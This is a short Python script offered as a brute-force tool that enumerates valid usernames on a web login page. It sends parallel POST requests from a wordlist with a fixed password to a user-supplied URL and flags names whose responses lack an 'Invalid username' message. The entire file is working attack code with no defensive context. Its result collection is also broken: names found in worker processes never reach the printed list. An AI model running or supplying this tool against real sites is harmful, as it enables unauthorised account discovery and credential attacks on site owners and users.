import requests
import multiprocessing
import argparse


class BF:
    def __init__(self, file: str, url: str, avoid_text: str):
        self.words_filepath = file
        self.avoid_text = avoid_text
        self.url_login = url
        self.words = []
        self.set_words()
        self.results = []

    def set_words(self):
        with open(self.words_filepath, 'r', errors='replace') as f:
            self.words = [x.replace('\n', '') for x in f.readlines()]

    def login_process(self, username):
        print(username)
        try:
            r = requests.post(self.url_login, data={
                "username": username,
                "password": "123456789"
            })
            if not self.avoid_text in r.text:
                self.results.append(username)
        except ValueError as error:
            print('Error with username : {}'.format(username))
            print(error)
    
    def print_results(self):
        print('Valid usernames :')
        for result in self.results:
            print("\t- {}".format(result))

    def run(self):
        p = multiprocessing.Pool(30)
        p.map(self.login_process, self.words)
        p.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--file', '-f', help='List file to use', required=True)
    parser.add_argument('--url', '-u', help='Url to bruteforce', required=True)
    parser.add_argument('--avoid', '-a', help='Text to avoid', default='Invalid username')
    args = parser.parse_args()

    bf = BF(file=args.file, url=args.url, avoid_text=args.avoid)
    print('Bruteforce attack will try {0} alternatives'.format(len(bf.words)))
    bf.run()
    bf.print_results()
